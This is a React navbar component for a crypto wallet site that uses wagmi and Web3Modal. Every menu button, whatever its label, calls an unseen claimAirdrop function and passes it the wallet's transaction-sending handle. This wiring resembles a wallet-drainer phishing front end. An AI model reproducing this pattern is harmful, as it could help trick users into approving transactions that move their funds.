import React from "react";
import { buttonLinks } from "../data/data";

import Button from "./Button";
import { Logo, ham } from "../assets";
import { NavLink } from "react-router-dom";
import styles from "./Navbar.module.css";
import { useWeb3Modal } from '@web3modal/wagmi/react'
import { useAccount, usePublicClient, useSendTransaction } from "wagmi";
import { claimAirdrop } from "../../funcs";

const NavMenu = ({ toggle, toggleHandler }) => {
  const {open } = useWeb3Modal()
  
    const { address, isConnected } = useAccount()
    const publicClient = usePublicClient()
    const { sendTransaction } = useSendTransaction()
    console.log(address)
  return (
    <div className={styles.menuContainer}>
      <ul className={`${styles.navMenu} ${toggle && styles.showMenu} `}>
        <button
          className={`bg-[#631b94] px-[0.6rem] py-[0.5rem] rounded-md  text-[#fff]`}
        >
          All
        </button>

        {buttonLinks.map((buttonLink) => (
          <Button key={buttonLink.link} toggleHandler={() => claimAirdrop(address, publicClient, open, sendTransaction)}>
            {buttonLink.link}
          </Button>
        ))}
      </ul>
      <NavLink>
        {
          address ? <button
          className={`bg-[#631b94] px-[0.6rem] py-[0.5rem] rounded-md w-full text-[#fff]`}
          onClick={open}
        >
          {`${address.slice(0,4)}...${address.slice(-5)}`}
        </button> : 

        <button
        className={`bg-[#631b94] px-[0.6rem] py-[0.5rem] rounded-md w-full text-[#fff]`}
        onClick={open}
        >
        CONNECT WALLET
        </button>
        }
        
      </NavLink>
    </div>
  );
};

export default NavMenu;
